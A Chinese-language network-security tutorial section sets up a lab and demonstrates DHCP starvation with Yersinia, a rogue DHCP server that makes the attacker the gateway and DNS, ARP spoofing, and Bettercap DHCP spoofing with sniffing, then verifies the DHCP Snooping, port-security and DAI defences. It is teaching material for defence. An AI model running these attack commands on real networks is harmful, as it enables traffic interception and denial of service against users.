# 实战攻防演练

### 6.1 攻击实验环境搭建

**实验拓扑**

```
Internet ---- 路由器 ---- 交换机 ---- DHCP服务器(合法)
                          |
                 +--------+--------+
                 |        |        |
              攻击者   受害者   监控端
```

**环境要求**

- 一台DHCP服务器（合法）：Linux + ISC DHCP
- 一台攻击者：Kali Linux
- 一台受害者：Windows/Linux
- 一台可网管交换机（支持DHCP Snooping）
- 一台监控端：安装Wireshark

**虚拟化实验环境**

使用GNS3或EVE-NG搭建虚拟实验环境：

```
# 拓扑配置
- vIOS交换机（支持DHCP Snooping）
- Linux容器作为DHCP服务器
- Kali容器作为攻击者
- Alpine容器作为受害者
```

### 6.2 Yersinia攻击演示

**DHCP饥饿攻击**

```bash
# 安装Yersinia
apt-get install yersinia

# 交互模式
yersinia -I
# 在界面中选择DHCP协议
# 选择"Launch DHCP starvation attack"

# 命令行模式
sudo yersinia -attack 1 -interface eth0

# 攻击效果验证
# 在DHCP服务器上查看:
cat /var/lib/dhcp/dhcpd.leases | wc -l
# 如果地址池耗尽，数量等于地址池大小

# 在交换机上查看:
show ip dhcp snooping binding
# 可以看到大量绑定的MAC地址
```

**伪造DHCP服务器攻击**

```bash
# 配置伪造DHCP服务器
cat > /etc/dhcp/dhcpd.conf << 'EOF'
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.200 192.168.1.250;
    option routers 192.168.1.254;  # 攻击者IP作为网关
    option domain-name-servers 192.168.1.254;
    default-lease-time 600;
}
EOF

# 启动伪造DHCP服务器
systemctl start isc-dhcp-server

# 同时启动IP转发和ARP欺骗
sysctl net.ipv4.ip_forward=1
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 使用Bettercap一体化攻击
sudo bettercap -iface eth0
set dhcp.spoof on
set dhcp.spoof.gateway 192.168.1.254
dhcp.spoof on
net.sniff on
```

### 6.3 防御验证

**验证DHCP Snooping**

```cisco
# 配置DHCP Snooping后，在攻击者端口发送DHCPOFFER
Switch# show ip dhcp snooping

# 查看绑定表
Switch# show ip dhcp snooping binding

# 查看被丢弃的报文统计
Switch# show ip dhcp snooping statistics

# 从攻击者机器发送DHCPOFFER将被丢弃
# 日志中可以看到违规记录:
Switch# show logging | include DHCP
```

**验证端口安全**

```cisco
# 查看端口安全状态
Switch# show port-security

# 查看端口安全配置
Switch# show port-security interface GigabitEthernet0/10

# 查看违规记录
Switch# show port-security address
```

**验证DAI**

```cisco
# 查看DAI配置
Switch# show ip arp inspection

# 查看DAI统计
Switch# show ip arp inspection statistics
```
